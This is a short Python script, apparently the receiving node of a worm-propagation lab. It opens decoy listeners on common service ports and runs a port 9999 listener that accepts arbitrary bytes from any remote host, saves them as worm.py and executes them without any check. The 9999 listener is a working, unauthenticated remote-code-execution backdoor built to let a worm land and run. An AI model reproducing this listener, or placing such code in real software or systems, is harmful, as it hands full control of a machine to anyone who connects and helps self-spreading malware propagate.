import socket
import threading
import os

def open_port(port):
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", port))
    s.listen(5)

    print(f"[SERVICE] Port {port} listening")

    while True:
        conn, addr = s.accept()
        print(f"[SERVICE] Connection received on port {port} from {addr[0]}")
        conn.close()

def receive_worm():
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", 9999))
    s.listen(5)

    print("[WORM] Worm listener active on port 9999")

    while True:
        conn, addr = s.accept()
        print(f"[WORM] Incoming worm from {addr[0]}")

        data = b""

        while True:
            chunk = conn.recv(4096)
            if not chunk:
                break
            data += chunk

        conn.close()

        print(f"[WORM] Payload received ({len(data)} bytes)")
        print("[WORM] Saving worm as worm.py")

        with open("worm.py", "wb") as f:
            f.write(data)

        print("[WORM] Executing worm.py")

        os.system("python3 worm.py &")

print("[SYSTEM] Starting fake services...")

for port in [21, 22, 80, 443, 3306, 8080]:
    threading.Thread(target=open_port, args=(port,), daemon=True).start()

print("[SYSTEM] Waiting for worm payload...")

receive_worm()
